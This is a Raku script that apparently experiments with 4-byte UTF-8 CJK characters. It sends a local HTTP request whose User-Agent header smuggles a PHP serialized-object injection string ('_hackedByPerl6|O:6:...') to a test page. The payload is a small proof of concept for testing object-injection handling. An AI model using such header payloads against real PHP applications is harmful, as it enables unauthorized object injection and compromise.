#!"C:\rakudo\bin\perl6"
use v6;
#use experimental :pack;


my $char = "𠀋";
my $utf8char = <131083 135741 135963 136302 137405 134047 136884 138804 143812 144836 145215 145251 146686 149489 152718 152846 153457 154052 155041 158463 159296 159988 161412 164471 164813 172432 131209 131234 131236 131490 131603 131883 131969 131953 132089 132170 132361 132566 132648 132943 133127 133178 133305 133500 133533 133843 133917 134469 134625 134805>.chrs.encode;
my $injection_str = '_hackedByPerl6|O:6:"Class1":1:{s:15:"%00Class1%00private";s:3:"prv";}';

my $conn = IO::Socket::INET.new(:host<localhost>, :port(80), :familly(2), :encoding('utf-8'), :nl-in("\r\n"));
$conn.print: "GET /phptest/phptest.php HTTP/1.1\n";
$conn.print: "Host: localhost\n";
$conn.print: "User-Agent: " ~ $injection_str ~ $utf8char.decode ~ "\n";
$conn.print: "Connection: close\n";
$conn.print: "\n";
say $conn.recv;
$conn.close;

my $blob = Blob.new($utf8char);
my $hex = $blob.unpack("H*");
$hex.say; #f0a0808b
$hex.ord.say; #102
$hex.ords.chrs.say; #f0a0808b

$utf8char.decode.ord.say; #131083
<090000>.chrs.say;
$char.ord.say;
<131083>.chrs.say;

"𠀋 𡈽 𡌛 𡑮 𡢽 𠮟 𡚴 𡸴 𣇄 𣗄 𣜿 𣝣 𣳾 𤟱 𥒎 𥔎 𥝱 𥧄 𥶡 𦫿 𦹀 𧃴 𧚄 𨉷 𨏍 𪆐 𠂉 𠂢 𠂤 𠆢 𠈓 𠌫 𠎁 𠍱 𠏹 𠑊 𠔉 𠗖 𠘨 𠝏 𠠇 𠠺 𠢹 𠥼 𠦝 𠫓 𠬝 𠵅 𠷡 𠺕 𠹭 𠹤 𠽟 𡈁 𡉕 𡉻 𡉴 𡋤 𡋗 𡋽 𡌶 𡍄 𡏄 𡑭 𡗗 𦰩 𡙇 𡜆 𡝂 𡧃 𡱖 𡴭 𡵅 𡵸 𡵢 𡶡 𡶜 𡶒 𡶷 𡷠 𡸳 𡼞 𡽶 𡿺 𢅻 𢌞 𢎭 𢛳 𢡛 𢢫 𢦏 𢪸 𢭏 𢭐 𢭆 𢰝 𢮦 𢰤 𢷡 𣇃 𣇵 𣆶 𣍲 𣏓 𣏒 𣏐 𣏤 𣏕 𣏚 𣏟 𣑊 𣑑 𣑋 𣑥 𣓤 𣕚 𣖔 𣘹 𣙇 𣘸 𣘺 𣜜 𣜌 𣝤 𣟿 𣟧 𣠤 𣠽 𣪘 𣱿 𣴀 𣵀 𣷺 𣷹 𣷓 𣽾 𤂖 𤄃 𤇆 𤇾 𤎼 𤘩 𤚥 𤢖 𤩍 𤭖 𤭯 𤰖 𤴔 𤸎 𤸷 𤹪 𤺋 𥁊 𥁕 𥄢 𥆩 𥇥 𥇍 𥈞 𥉌 𥐮 𥓙 𥖧 𥞩 𥞴 𥧔 𥫤 𥫣 𥫱 𥮲 𥱋 𥱤 𥸮 𥹖 𥹥 𥹢 𥻘 𥻂 𥻨 𥼣 𥽜 𥿠 𥿔 𦀌 𥿻 𦀗 𦁠 𦃭 𦉰 𦊆 𦍌 𣴎 𦐂 𦙾 𦚰 𦜝 𦣝 𦣪 𦥑 𦥯 𦧝 𦨞 𦩘 𦪌 𦪷 𦱳 𦳝 𦹥 𦾔 𦿸 𦿶 𦿷 𧄍 𧄹 𧏛 𧏚 𧏾 𧐐 𧑉 𧘕 𧘔 𧘱 𧚓 𧜎 𧜣 𧝒 𧦅 𧪄 𧮳 𧮾 𧯇 𧲸 𧶠 𧸐 𧾷 𨂊 𨂻 𨊂 𨋳 𨐌 𨑕 𨕫 𨗈 𨗉 𨛗 𨛺 𨥉 𨥆 𨥫 𨦇 𨦈 𨦺 𨦻 𨨞 𨨩 𨩱 𨩃 𨪙 𨫍 𨫤 𨫝 𨯁 𨯯 𨴐 𨵱 𨷻 𨸟 𨸶 𨺉 𨻫 𨼲 𨿸 𩊠 𩊱 𩒐 𩗏 𩙿 𩛰 𩜙 𩝐 𩣆 𩩲 𩷛 𩸽 𩸕 𩺊 𩹉 𩻄 𩻩 𩻛 𩿎 𪀯 𪀚 𪃹 𪂂 𢈘 𪎌 𪐷 𪗱 𪘂 𪘚 𪚲".ords.say;
